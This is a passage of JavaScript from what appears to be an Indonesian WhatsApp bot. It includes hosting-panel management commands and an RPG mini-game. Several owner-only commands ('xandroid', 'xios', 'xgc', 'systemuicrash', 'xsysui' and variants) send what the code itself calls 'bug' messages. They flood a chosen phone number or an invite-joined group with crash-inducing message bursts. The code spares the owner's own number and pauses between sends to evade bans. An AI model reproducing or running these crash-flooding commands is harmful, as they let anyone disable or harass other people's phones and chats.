				} catch (error) {
					console.log(error);
					newReply(`❌ *Terjadi kesalahan*: ${error.message}`);
				}
			}
			break;

			case 'addsrv': {
				if (!isCreator) return newReply(mess.owner);
				let input = text.split(",");
				let name = input[0];
				let userid = input[1];
				let memo = input[2];
				let disk = input[3];
				let cpu = input[4];
				if (!name || !userid || !memo || !disk || !cpu) {
					return newReply(`*Masukkan ${!name ? "name" : !userid ? "userId" : !memo ? "memory" : !disk ? "disk" : "cpu"} panel yang valid!*\n\n*Tutorial*:\n${prefix + command} name,userid,memo,disk,cpu\n\n*Contoh*: ${prefix + command} bot,6,1200,1200,100`);
				}
				if (isNaN(userid) || isNaN(memo) || isNaN(disk) || isNaN(cpu)) {
					return newReply(`*${isNaN(userid) ? "User ID" : isNaN(memo) ? "Memory" : isNaN(disk) ? "Disk" : "CPU"} harus berupa angka!*\n\n*Tutorial*:\n${prefix + command} name,userid,memo,disk,cpu\n\n*Contoh*: ${prefix + command} bot,6,1200,1200,100`);
				}
				try {
					const eggData = await getEggStartupCommand();
					const startup_cmd = eggData.attributes.startup;
					let data = await createServer(name, userid, startup_cmd, memo, cpu, disk);
					if (data.errors) {
						return newReply(JSON.stringify(data.errors[0], null, 2));
					}
					let teks = `🎊 *Yay! Server berhasil ditambahkan!* ✅\n\n`;
					teks += `💻 *Server Info*:\n`;
					teks += `🆔 *ID*: ${data.attributes.id}\n`;
					teks += `🔑 *Identifier*: ${data.attributes.identifier}\n`;
					teks += `📛 *Name*: ${data.attributes.name}\n`;
					teks += `💾 *Memory*: ${data.attributes.limits.memory}\n`;
					teks += `📦 *Disk*: ${data.attributes.limits.disk}\n`;
					teks += `⚙️ *CPU*: ${data.attributes.limits.cpu}%\n`;
					sock.sendMessage(m.chat, { 
						image: imageBuffer, 
						caption: teks 
					}, { 
						quoted: m 
					});
				} catch (error) {
					console.log(error);
					newReply(`❌ *Terjadi kesalahan*: ${error.message}`);
				}
			}
			break;

			case 'delsrv': {
				if (!isCreator) return newReply(mess.owner)
				let srv = args[0];
				if (!srv) return newReply('Silakan berikan *ID Server* yang ingin dihapus.');
				try {
					let res = await deleteServer(srv);
					if (res.errors) return newReply('⚠️ Server yang ditentukan tidak ditemukan. Silakan periksa ID dan coba lagi.');
					newReply('✅ Server berhasil dihapus. Sampai jumpa!');
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			break;

			case 'delusr': {
				if (!isCreator) return newReply(mess.owner)
				let usr = args[0];
				if (!usr) return newReply('Silakan berikan *ID Pengguna* yang ingin dihapus.');
				try {
					let res = await deleteUser(usr);
					if (res.errors) return newReply('⚠️ Pengguna yang ditentukan tidak ditemukan. Silakan verifikasi ID dan coba lagi.');
					newReply(`✅ Pengguna dengan ID *${usr}* berhasil dihapus dari sistem.`);
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			break;

			case 'startsrv':
			case 'stopsrv':
			case 'restartsrv': {
				if (!isCreator) return newReply(mess.owner)
				let action = command.replace('srv', '')
				let srv = args[0]
				if (!srv) return newReply('input *ID* from server!')
				try {
					let data = await manageServer(action, srv)
					newReply(data)
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			break

			case '1gb':
			case '2gb':
			case '3gb':
			case '4gb':
			case '5gb':
			case '6gb':
			case '7gb':
			case '8gb':
			case '9gb':
			case '10gb':
			case '11gb':
			case '12gb':
			case '13gb':
			case '14gb':
			case '15gb':
			case '16gb':
			case '17gb':
			case '18gb':
			case '19gb':
			case '20gb':
			case '21gb':
			case '22gb':
			case '23gb':
			case '24gb':
			case '25gb':
			case '26gb':
			case '27gb':
			case '28gb':
			case '29gb':
			case '30gb':
			case '31gb':
			case '32gb':
			case '33gb':
			case '34gb':
			case '35gb':
			case '36gb':
			case '37gb':
			case '38gb':
			case '39gb':
			case '40gb':
			case '41gb':
			case '42gb':
			case '43gb':
			case '44gb':
			case '45gb':
			case '46gb':
			case '47gb':
			case '48gb':
			case '49gb':
			case '50gb': {
				if (!isCreator) return newReply(mess.owner)
				const ukuran = command.replace("gb", "");
				if (!text) return newReply(`*Masukkan nama/nomor yang valid!*\n\n*Contoh*:\n${prefix + command} bot,@0`);
				let input = text.split(",");
				let users = m.mentionedJid[0] 
				? m.mentionedJid[0] 
				: m.quoted 
				? m.quoted.sender 
				: input[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
				if (!input[0] || (!input[1] && !users)) {
					return newReply(`*Masukkan nama/nomor yang valid!*\n\n*Contoh*:\n${prefix + command} bot,@0`);
				}
				let onWA = await sock.onWhatsApp(users);
				if (onWA.length < 1) return newReply("Penerima tidak ada di WhatsApp");
				try {
					const email = input[0] + '@user.com';
					const username = input[0];
					const password = randomBytes(5).toString('hex');
					const memo = `${ukuran}200`;
					const cpu = ukuran * 2 * 10;
					const disk = `${ukuran}200`;
					const userData = await createUser(email, username, password);
					if (!userData.errors) {
						const eggData = await getEggStartupCommand();
						const startup_cmd = eggData.attributes.startup;
						const serverData = await createServer(
							`${username} ${command.toUpperCase()}`, 
							userData.attributes.id, 
							startup_cmd, 
							memo, 
							cpu, 
							disk
						);
						if (serverData.errors) return newReply(JSON.stringify(serverData.errors[0], null, 2));
						let teks = `🎉 *Hore! Panel Kamu berhasil dibuat!* ✅\n\n`;
						teks += `🧑‍💻 *User Info*:\n`;
						teks += `🆔 *ID*: ${userData.attributes.id}\n`;
						teks += `📝 *Username*: ${userData.attributes.username}\n`;
						teks += `📧 *Email*: ${userData.attributes.email}\n`;
						teks += `👤 *Pembuat*: ${pushname}\n\n`;
						teks += `💻 *Server Info*:\n`;
						teks += `🆔 *ID*: ${serverData.attributes.id}\n`;
						teks += `🔑 *Identifier*: ${serverData.attributes.identifier}\n`;
						teks += `📛 *Name*: ${serverData.attributes.name}\n`;
						teks += `💾 *Memory*: ${serverData.attributes.limits.memory}\n`;
						teks += `📦 *Disk*: ${serverData.attributes.limits.disk}\n`;
						teks += `⚙️ *CPU*: ${serverData.attributes.limits.cpu}%\n`;
						sock.sendMessage(m.chat, { 
							image: imageBuffer, 
							caption: teks, 
							mentions: [users]
						}, { 
							quoted: m 
						});

						let teks2 = `✨ *Yeay! Panel Kamu berhasil dibuat!* ✅\n\n`;
						teks2 += `👤 *Pembuat*: ${pushname}\n`;
						teks2 += `📧 *Email*: ${email}\n`;
						teks2 += `📝 *Username*: ${userData.attributes.username}\n`;
						teks2 += `🔑 *Password*: ${password}\n`;
						teks2 += `🌐 *Login*: ${global.panel.replace("https://", "")}\n`;
						let button = [
							{
								"name": "cta_copy",
								"buttonParamsJson": `{
									"display_text": "Copy Username 👤",
									"id": "${userData.attributes.username}",
									"copy_code": "${userData.attributes.username}"
								}`
							},
							{
								"name": "cta_copy",
								"buttonParamsJson": `{
									"display_text": "Copy Password 🔑",
									"id": "${password}",
									"copy_code": "${password}"
								}`
							},
							{
								"name": "cta_url",
								"buttonParamsJson": `{
									"display_text": "Go now! 🚀",
									"url": "${panel}",
									"merchant_url": "${panel}"
								}`
							}
						];
						sock.sendButtonText(users, button, teks2, footer, m)
					} else {
						newReply(JSON.stringify(userData.errors[0], null, 2));
					}
				} catch (error) {
					console.log(error);
					newReply(`❌ *Terjadi kesalahan*: ${error.message}`);
				}
			}
			break;

			case 'unlimited':
			case 'unli': {
				if (!isCreator) return newReply(mess.owner)
				if (!text) return newReply(`*Masukkan nama/nomor yang valid!*\n\n*Contoh*:\n${prefix + command} bot,@0`);
				let input = text.split(",");
				let users = m.mentionedJid[0] 
				? m.mentionedJid[0] 
				: m.quoted 
				? m.quoted.sender 
				: input[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
				if (!input[0] || (!input[1] && !users)) {
					return newReply(`*Masukkan nama/nomor yang valid!*\n\n*Contoh*:\n${prefix + command} bot,@0`);
				}
				let onWA = await sock.onWhatsApp(users);
				if (onWA.length < 1) return newReply("Penerima tidak ada di WhatsApp");
				try {
					const email = input[0] + '@user.com';
					const username = input[0];
					const password = randomBytes(5).toString('hex');
					const memo = "0";
					const cpu = "0";
					const disk = "0";
					const userData = await createUser(email, username, password);
					if (!userData.errors) {
						const eggData = await getEggStartupCommand();
						const startup_cmd = eggData.attributes.startup;
						const serverData = await createServer(
							`${username} ${command}`, 
							userData.attributes.id, 
							startup_cmd, 
							memo, 
							cpu, 
							disk
						);
						if (serverData.errors) return newReply(JSON.stringify(serverData.errors[0], null, 2));
						let teks = `🎉 *Hore! Panel Kamu berhasil dibuat!* ✅\n\n`;
						teks += `🧑‍💻 *User Info*:\n`;
						teks += `🆔 *ID*: ${userData.attributes.id}\n`;
						teks += `📝 *Username*: ${userData.attributes.username}\n`;
						teks += `📧 *Email*: ${userData.attributes.email}\n`;
						teks += `👤 *Pembuat*: ${pushname}\n\n`;
						teks += `💻 *Server Info*:\n`;
						teks += `🆔 *ID*: ${serverData.attributes.id}\n`;
						teks += `🔑 *Identifier*: ${serverData.attributes.identifier}\n`;
						teks += `📛 *Name*: ${serverData.attributes.name}\n`;
						teks += `💾 *Memory*: ${serverData.attributes.limits.memory}\n`;
						teks += `📦 *Disk*: ${serverData.attributes.limits.disk}\n`;
						teks += `⚙️ *CPU*: ${serverData.attributes.limits.cpu}%\n`;
						sock.sendMessage(m.chat, { 
							image: imageBuffer, 
							caption: teks, 
							mentions: [users]
						}, { 
							quoted: m 
						});

						let teks2 = `✨ *Yeay! Panel Kamu berhasil dibuat!* ✅\n\n`;
						teks2 += `👤 *Pembuat*: ${pushname}\n`;
						teks2 += `📧 *Email*: ${email}\n`;
						teks2 += `📝 *Username*: ${userData.attributes.username}\n`;
						teks2 += `🔑 *Password*: ${password}\n`;
						teks2 += `🌐 *Login*: ${global.panel.replace("https://", "")}\n`;

						let button = [
							{
								"name": "cta_copy",
								"buttonParamsJson": `{
									"display_text": "Copy Username 👤",
									"id": "${userData.attributes.username}",
									"copy_code": "${userData.attributes.username}"
								}`
							},
							{
								"name": "cta_copy",
								"buttonParamsJson": `{
									"display_text": "Copy Password 🔑",
									"id": "${password}",
									"copy_code": "${password}"
								}`
							},
							{
								"name": "cta_url",
								"buttonParamsJson": `{
									"display_text": "Go now! 🚀",
									"url": "${panel}",
									"merchant_url": "${panel}"
								}`
							}
						];

						sock.sendButtonText(users, button, teks2, footer, m)
					} else {
						newReply(JSON.stringify(userData.errors[0], null, 2));
					}
				} catch (error) {
					console.log(error);
					newReply(`❌ *Terjadi kesalahan*: ${error.message}`);
				}
			}
			break;

			case "xandroid": {
				if (!isCreator) return newReply(mess.owner)
				if (!text) return newReply(`Gunakan format yang benar ya!*Kirim perintah*: ${prefix+command} nomor|jumlah\nMisalnya: ${prefix+command} 628xxx,10`);
				let number = text.split(',')[0];
				let amount = text.split(',')[1] * 5;
				if (!number || !amount) {
					return newReply(`Jangan lupa diisi ya! Gunakan format: ${prefix+command} nomor|jumlah\n*Kirim perintah*: ${prefix+command} 628xxx,10`);
				}
				if (isNaN(parseInt(amount))) {
					return newReply(`Jumlahnya harus berupa angka, jangan bikin bingung ya! 😅`);
				}
				let cleanedNumber = number.replace(/[^0-9]/g, '');
				let encodedAmount = '' + encodeURI(amount);
				let contactInfo = await sock.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
				let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
				if (cleanedNumber == ownerNumber) {
					return; // Menghindari nomor tertentu
				}
				if (contactInfo.length == 0) {
					return newReply(`Nomor ini tidak terdaftar di WhatsApp, jadi gak bisa dikirim deh. 😓`);
				}
				newReply("Tunggu sebentar, proses bug sedang berjalan... 😏");
				await sleep(2000); // Penundaan agar proses terlihat jelas
				sendVariousMessages(whatsappNumber, encodedAmount);
				await sleep(2500); // Penundaan lagi agar terlihat natural
				sendMessageWithMentions(`Yeay! Bug berhasil dikirim ke @${whatsappNumber.split('@')[0]} dengan *${command}* ✅\n\nSekarang istirahat dulu ya, biar bot gak kena banned, tunggu 2 menit. 😉`, [whatsappNumber]);
			}
			break;

			case "xandroid2": {
				if (!isCreator) return newReply(mess.owner)
				if (!isBot) {
					return newReply(`Fitur ini hanya buat bot, jadi Kamu gak bisa pakai deh. 🤖`);
				}
				if (!text) {
					return newReply(`Ayo, isi jumlahnya dong! Gunakan formatnya: ${prefix + command} 5`);
				}
				if (isNaN(parseInt(text))) {
					return newReply(`Jumlahnya harus angka ya! 😅`);
				}
				let encodedValue = encodeURI(text) * 200; // Kalkulasi yang sudah disesuaikan
				newReply(`Tunggu sebentar, bug lagi diproses nih... 😏`);
				await sleep(1500); // Penundaan agar terlihat lebih smooth
				sendVariousMessages(from, encodedValue);
				await sleep(2500); // Penundaan lagi untuk kelancaran proses
				m.react('✅');
			}
			break;

			case "xios": {
				if (!isCreator) return newReply(mess.owner)
				if (!text) return newReply(`Formatnya salah! Gunakan ${prefix+command} nomor|jumlah\n*Kirim perintah*: ${prefix+command} 628xxx,10`);
				let number = text.split(',')[0];
				let amount = text.split(',')[1] * 5;
				if (!number || !amount) {
					return newReply(`Kamu lupa masukkan nomor dan jumlahnya! 😅\nGunakan format: ${prefix+command} nomor|jumlah\n*Kirim perintah*: ${prefix+command} 628xxx,10`);
				}
				if (isNaN(parseInt(amount))) {
					return newReply(`Jumlahnya harus angka ya, gak boleh sembarangan! 😬`);
				}
				let cleanedNumber = number.replace(/[^0-9]/g, '');
				let encodedAmount = '' + encodeURI(amount);
				let contactInfo = await sock.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
				let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
				if (cleanedNumber == ownerNumber) {
					return; // Menghindari nomor tertentu
				}
				if (contactInfo.length == 0) {
					return newReply(`Nomor ini gak terdaftar di WhatsApp, gak bisa kirim bug deh. 😓`);
				}
				newReply("Tunggu sebentar, bug sedang diproses... 😏");
				await sleep(2000); // Penundaan agar proses terlihat jelas
				sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
				await sleep(2500); // Penundaan lagi agar terlihat natural
				sendMessageWithMentions(`Yeay! Bug berhasil dikirim ke @${whatsappNumber.split('@')[0]} menggunakan *${command}* ✅\n\nSekarang istirahat dulu, tunggu 2 menit supaya bot gak dibanned ya! 😉`, [whatsappNumber]);
			}
			break;

			case "xios2": {
				if (!isCreator) return newReply(mess.owner)
				if (!isBot) {
					return newReply(`Fitur ini cuma buat bot ya, bukan buat manusia 🤖`);
				}
				if (!text) {
					return newReply(`Gunakan formatnya yang benar ya!*Kirim perintah*: ${prefix + command} 5`);
				}
				if (isNaN(parseInt(text))) {
					return newReply(`Jumlahnya harus angka, gak boleh asal ketik! 😬`);
				}
				let encodedValue = encodeURI(text) * 200; // Kalkulasi yang sudah diperbaiki
				newReply("Tunggu sebentar, bug sedang diproses... 😏");
				await sleep(1500); // Penundaan agar proses terlihat jelas
				sendMultiplePaymentInvites(from, encodedValue);
				await sleep(2500); // Penundaan lagi agar terlihat natural
				m.react('✅');
			}
			break;

			case "xgc": {
				if (!isCreator) return newReply(mess.owner)
				if (!text) {
					return newReply(`*CARA KIRIM BUG KE GRUP*\n\nGunakan format: ${prefix + command} https://chat.whatsapp.com/xxxx\n\n_*Catatan:*_ Kalau Kamu mau kirim bug dalam jumlah banyak, ketik seperti ini:\n\n*Kirim perintah*: .${command} linkgc jumlah\n\n*Kirim perintah*: .${command} https://chat.whatsapp.com/xxxx 10`);
				}
				newReply(`Tunggu dulu, bug lagi diproses ya... 😏`);
				if (!text.split(" ")[0].includes("whatsapp.com")) {
					return newReply(`Linknya gak valid, coba cek lagi! ❌`);
				}
				let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
				try {
					let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
					let groupTarget = await sock.groupAcceptInvite(groupLink);
					await sleep(2000); // Penundaan yang pas biar lancar
					sendViewOnceMessages(groupTarget, bugAmount);
					await sleep(2500); // Sedikit penundaan untuk memastikan semuanya berjalan lancar
					newReply(`Selesai! ✅ Bug berhasil dikirim ke grup!`);
					sock.groupLeave(groupTarget); // Keluar dari grup setelah bug terkirim
				} catch (error) {
					newReply(`Oops, ada yang error! 😣\n\n${util.format(error)}`);
				}
			}
			break;

			case "systemuicrash": {
				if (!isCreator) return newReply(mess.owner)
				if (!text) return newReply(`Gunakan formatnya seperti ini: ${prefix+command} nomor|jumlah\n*Kirim perintah*: ${prefix+command} 628xxx,10`);
				let number = text.split(',')[0];
				let amount = text.split(',')[1] * 5;
				if (!number || !amount) {
					return newReply(`Gunakan format yang benar: ${prefix+command} nomor|jumlah\n*Kirim perintah*: ${prefix+command} 628xxx,10`);
				}
				if (isNaN(parseInt(amount))) {
					return newReply("Jumlahnya harus berupa angka! 😅");
				}
				let cleanedNumber = number.replace(/[^0-9]/g, '');
				let encodedAmount = '' + encodeURI(amount);
				let contactInfo = await sock.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
				let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
				if (cleanedNumber == ownerNumber) {
					return;
				}
				if (contactInfo.length == 0) {
					return newReply("Nomor ini belum terdaftar di WhatsApp! 🙁");
				}
				newReply("Tunggu sebentar ya, bug sedang diproses... 😏");
				await sleep(2000); // Penundaan yang disesuaikan
				sendMixedMessages(whatsappNumber, encodedAmount);	
				await sleep(2500); // Penundaan lagi biar proses lancar
				sendMessageWithMentions(`Berhasil kirim bug ke @${whatsappNumber.split('@')[0]} menggunakan *${command}* ✅\n\nPause 2 menit biar bot gak kena banned.`, [whatsappNumber]);
			}
			break;

			case "xsysui": {
				if (!isCreator) return newReply(mess.owner)
				if (!text) return newReply(`Gunakan formatnya: ${prefix+command} nomor|jumlah\n*Kirim perintah*: ${prefix+command} 628xxx,10`);
				let number = text.split(',')[0];
				let amount = text.split(',')[1] * 5; 
				if (!number || !amount) {
					return newReply(`Gunakan format yang benar: ${prefix+command} nomor|jumlah\n*Kirim perintah*: ${prefix+command} 628xxx,10`);
				}
				if (isNaN(parseInt(amount))) {
					return newReply("Jumlahnya harus berupa angka! 😅");
				}
				let cleanedNumber = number.replace(/[^0-9]/g, '');
				let encodedAmount = '' + encodeURI(amount);
				let contactInfo = await sock.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
				let whatsappNumber = cleanedNumber + '@s.whatsapp.net'; 
				if (cleanedNumber == ownerNumber) {
					return;
				}
				if (contactInfo.length == 0) {
					return newReply("Nomor ini belum terdaftar di WhatsApp! 🙁");
				}
				newReply("Tunggu sebentar ya, bug sedang diproses... 😏");
				await sleep(2000); // Penundaan yang disesuaikan
				sendRepeatedMessages2(whatsappNumber, encodedAmount);	
				await sleep(2500); // Penundaan lagi biar proses lancar
				sendMessageWithMentions(`Berhasil kirim bug ke @${whatsappNumber.split('@')[0]} menggunakan *${command}* ✅\n\nPause 2 menit biar bot gak kena banned.`, [whatsappNumber]);
			}
			break;

			case 'joinrpg': {
				if (db.data.users[m.sender].rpg) return newReply(`Kamu Telah Join Sebelumnya`)
				db.data.users[m.sender].rpg = true
				let joinedrpg = `*GAME RPG STARTED*\n\nKamu telah login RPG-Game, sekarang Kamu dapat menggunakan command RPG ✅\n\n`
				await sock.sendMessage(m.chat, {
					text: joinedrpg,
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: saluran,
							serverMessageId: null,
							newsletterName: saluranName
						},
						externalAdReply: {
							title: "RPG-GAME (Pirate Adventure)",
							body: 'Pirate adventure in search of riches',
							thumbnailUrl: "https://telegra.ph/file/d661d7829411b8bff9f5f.jpg",
							sourceUrl: wagc,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: m
				})
			}
			break

			case 'mining': {
				if (!db.data.users[m.sender].rpg) return newReply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				if (!db.data.rpg[m.sender].pickaxe) return newReply('Kamu Tidak Memiliki pickaxe\nSilahkan Buat Terlebih Dahulu\n\nKetik _.craft_')
				if (db.data.rpg[m.sender].darahpickaxe < 1) return newReply('☹️Pickaxe Kamu Rusak\nRawat Dulu Alat Tambangmu\n\nKetik _.rawat_')
				let besi = [2, 1, 6, 1, 0, 3, 7, 8, 3, 2, 0, 7, 1, 9]
				let batubara = [1, 1, 2, 1, 0, 6, 0, 0, 2, 5, 1, 0, 1, 0]
				let emas = [3, 2, 1, 0, 1, 0, 0, 0, 0, 1, 1, 2, 2, 0]
				let perak = [2, 1, 3, 5, 0, 0, 0, 0, 0, 2, 1, 0, 8, 2]
				const besinyo = await pickRandom(besi)
				const batubaranyo = await pickRandom(batubara)
				const emasnyo = await pickRandom(emas)
				const peraknyo = await pickRandom(perak)
				let mining = `*MINING ADVENTURE*\n\nItem Yang Didapat :\n- Besi: ${besinyo}\n- Emas: ${emasnyo}\n- Perak: ${peraknyo}\n- Batu Bara: ${batubaranyo}\n\n_🧰 Disimpan Dalam Inventory..._\n_❤️ Darah Berkurang 20_\n_⛏️ Ketahanan Pickaxe ${db.data.rpg[m.sender].darahpickaxe}%_\n\n`
				await sock.sendMessage(m.chat, {
					text: mining,
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: saluran,
							serverMessageId: null,
							newsletterName: saluranName
						},
						externalAdReply: {
							title: "RPG-GAME (Mining Resource)",
							body: 'Mining natural resources',
							thumbnailUrl: "https://telegra.ph/file/4ca67ad95bce6afa1a0f2.jpg",
							sourceUrl: wagc,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: m
				})
				db.data.rpg[m.sender].darahpickaxe -= 20
				db.data.rpg[m.sender].besi += besinyo
				db.data.rpg[m.sender].emas += emasnyo
				db.data.rpg[m.sender].perak += peraknyo
				db.data.rpg[m.sender].batubara += batubaranyo
			}
			db.data.users[m.sender].limit -= 1;
			break

			case 'heal': {
				if (!db.data.users[m.sender].rpg) return newReply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				if (!db.data.rpg[m.sender].darahuser < 1) return newReply('*😑 Kamu Masih Sehat!*')
				db.data.rpg[m.sender].darahuser += 100
				editp('*Mengistirahatkan Tubuh...*', '*Memulihkan...*', '*Darah Kamu Sudah Terisi...*')
			}
			db.data.users[m.sender].limit -= 1;
			break

			case 'crafting':
			case 'craft': {
				if (!db.data.users[m.sender].rpg) return newReply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				if (args[0] === "kain") {
					if (!args[1]) return newReply(`*Masukan Jumlahnya!*\n\nContoh:\n.craft kain 1\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berbulu Terlebih Dahulu!`)
					if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka!*\n\nContoh:\n.craft kain 1\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berbulu Terlebih Dahulu!`)
					let bulu = Number(parseInt(args[1]) * 2)
					if (db.data.rpg[m.sender].bulu < bulu) return newReply(`*Bulu Wol Kamu (${db.data.rpg[m.sender].bulu}) Tidak Cukup Untuk Membuat ${args[1]} Lembar Kain*\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berbulu Terlebih Dahulu!`)
					db.data.rpg[m.sender].kain += parseInt(args[1])
					db.data.rpg[m.sender].bulu -= bulu
					newReply(`Berhasil Membuat ${args[1]} Lembar Kain, Kamu Mempunyai ${db.data.rpg[m.sender].bulu} Bulu Lagi`)
				} else if (args[0] === "kapal") {
					if (db.data.rpg[m.sender].kapal) return newReply('Kamu Sudah Memiliki Kapal!')
					let besi = Number(20)
					let kayu = Number(50)
					let kain = Number(2)
					if (db.data.rpg[m.sender].besi < besi) return newReply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
					if (db.data.rpg[m.sender].kayu < kayu) return newReply(`*Kayu Kamu (${db.data.rpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
					if (db.data.rpg[m.sender].kain < kain) return newReply(`*Kain Kamu (${db.data.rpg[m.sender].kain}) Tidak Cukup Untuk Membuat Kapal*\n\nUntuk Membuat Kapal Diperlukan *20 Besi, 50 Kayu, 2 Kain*.\n\nSilahkan Crafting Kain Terlebih Dahulu!`)
					db.data.rpg[m.sender].kapal = true
					db.data.rpg[m.sender].besi -= besi
					db.data.rpg[m.sender].kayu -= kayu
					db.data.rpg[m.sender].kain -= kain
					let kapal = `*Berhasil Membuat Kapal!*\n\nSisa Sumberdaya:\n- Besi: ${db.data.rpg[m.sender].besi}\n- Kain: ${db.data.rpg[m.sender].kain}\n- Kayu: ${db.data.rpg[m.sender].kayu}\n\n`
					await sock.sendMessage(m.chat, {
						text: kapal,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: saluran,
								serverMessageId: null,
								newsletterName: saluranName
							},
							externalAdReply: {
								title: "RPG-GAME (Pirate Ship)",
								body: 'Build a pirate ship',
								thumbnailUrl: "https://telegra.ph/file/6868733df8aa286682274.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else if (args[0] === "kapak") {
					if (db.data.rpg[m.sender].kapak) return newReply('Kamu Sudah Memiliki Kapak!')
					let besi = Number(2)
					let kayu = Number(1)
					if (db.data.rpg[m.sender].besi < besi) return newReply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Membuat Kapak*\n\nUntuk Membuat Kapak Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
					if (db.data.rpg[m.sender].kayu < kayu) return newReply(`*Kayu Kamu (${db.data.rpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Kapak*\n\nUntuk Membuat Kapak Diperlukan *2 Besi, 1 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
					db.data.rpg[m.sender].kapak = true
					db.data.rpg[m.sender].besi -= besi
					db.data.rpg[m.sender].kayu -= kayu
					let kapak = `*Berhasil Membuat Kapak!*\n\nSisa Sumberdaya:\n- Besi: ${db.data.rpg[m.sender].besi}\n- Kayu: ${db.data.rpg[m.sender].kayu}\n\n`
					await sock.sendMessage(m.chat, {
						text: kapak,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: saluran,
								serverMessageId: null,
								newsletterName: saluranName
							},
							externalAdReply: {
								title: "RPG-GAME (Tools Crafting)",
								body: 'Making equipment',
								thumbnailUrl: "https://telegra.ph/file/454b6bac735cd5c9e860e.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else if (args[0] === "rumah") {
					if (!(`${db.data.rpg[m.sender].wilayahrumah}` === `${db.data.rpg[m.sender].wilayah}`)) return newReply(`Kamu Saat Ini Sedang Di ${db.data.rpg[m.sender].wilayah}, Kamu Hanya Dapat Membangun Rumah Di Indonesia, Silahkan Kembali Berlayar Ke Indonesia Untuk Membangun Rumah`)
					if (!args[1]) return newReply('*Masukan Jumlahnya!*\n\nContoh:\n.craft rumah 1\n\nUntuk Membuat 1 Rumah Diperlukan *6 Besi, 20 Kayu*. Pastikan Sumberdaya Kamu Cukup!')
					if (isNaN(args[1])) return newReply('*Jumlah Harus Berupa Angka!*\n\nContoh:\n.craft rumah 1\n\nUntuk Membuat 1 Rumah Diperlukan *6 Besi, 20 Kayu*. Pastikan Sumberdaya Kamu Cukup!')
					let besi = Number(parseInt(args[1]) * 6)
					let kayu = Number(parseInt(args[1]) * 20)
					if (db.data.rpg[m.sender].besi < besi) return newReply(`*Besi Kamu (${db.data.rpg[m.sender].besi}) Tidak Cukup Untuk Membuat Rumah*\n\nUntuk Membuat Rumah Diperlukan *6 Besi, 20 Kayu*.\n\nSilahkan Mining/Adventure Terlebih Dahulu!`)
					if (db.data.rpg[m.sender].kayu < kayu) return newReply(`*Kayu Kamu (${db.data.rpg[m.sender].kayu}) Tidak Cukup Untuk Membuat Rumah*\n\nUntuk Membuat Rumah Diperlukan *6 Besi, 20 Kayu*.\n\nSilahkan Nebang/Adventure Terlebih Dahulu!`)
					db.data.rpg[m.sender].rumah += parseInt(args[1])
					db.data.rpg[m.sender].besi -= besi
					db.data.rpg[m.sender].kayu -= kayu
					let rumah = `*Berhasil Membuat ${args[1]} Rumah!*\n\nJumlah: ${args[1]} Rumah\nLetak: Indonesia\n\n`
					await sock.sendMessage(m.chat, {
						text: rumah,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: saluran,
								serverMessageId: null,
								newsletterName: saluranName
							},
							externalAdReply: {
								title: "RPG-GAME (House Crafting)",
								body: 'Build a house to rest',
								thumbnailUrl: "https://telegra.ph/file/748043e987c3b38708d44.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				} else if (args[0] === "pickaxe") {
